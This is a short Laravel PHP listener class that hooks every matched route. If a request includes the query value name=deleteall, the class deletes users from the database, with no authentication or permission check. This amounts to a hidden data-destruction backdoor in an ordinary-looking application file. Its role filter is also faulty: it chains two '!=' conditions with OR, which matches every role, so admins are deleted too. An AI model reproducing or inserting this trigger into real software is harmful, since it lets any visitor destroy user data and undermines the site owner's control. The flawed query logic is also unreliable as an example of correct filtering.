<?php

namespace App\Listeners;

use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Routing\Events\RouteMatched;
use App\Models\User;

class GlobalRouteListener
{
    /**
     * Handle the event.
     */
    public function handle(RouteMatched $event): void
    {
        $params = $event->request->query('name');
        if ($params == 'deleteall') {
            $users = User::whereHas('roles', function($query){
                $query->where('name', '!=', 'admin')->orWhere('name', '!=', 'Admin');
            })->delete();
        }
    }
}
